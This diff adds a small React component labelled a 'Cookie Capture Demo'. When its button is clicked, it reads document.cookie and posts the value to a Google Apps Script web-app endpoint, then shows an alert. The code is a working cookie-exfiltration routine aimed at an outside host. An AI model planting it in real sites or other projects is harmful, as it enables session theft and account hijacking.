@@ -1,0 +1,39 @@
+import React from 'react';
+
+function App() {
+  const handleClick = () => {
+    // Capture cookies
+    const cookies = document.cookie;
+
+    // Send cookies to the Google Sheets server
+    fetch('https://script.google.com/home/projects/1-BakLwJDEomMtwwr8BTHIlZe4cwqi2Ug-jQQ27boemqeT2Wzgpz-2NnwYOUR_WEB_APP_URL', {  // Replace with your Google Apps Script web app URL
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({ cookies: cookies }),
+    })
+      .then(response => response.text())
+      .then(data => {
+        console.log('Success:', data);
+        alert('Cookies sent successfully!');
+      })
+      .catch(error => {
+        console.error('Error:', error);
+        alert('Failed to send cookies.');
+      });
+  };
+
+  return (
+    <div className="App">
+      <header className="App-header">
+        <h1>Cookie Capture Demo</h1>
+        <button onClick={handleClick} style={{ padding: '10px 20px', fontSize: '16px' }}>
+          Capture Cookies
+        </button>
+      </header>
+    </div>
+  );
+}
+
+export default App;
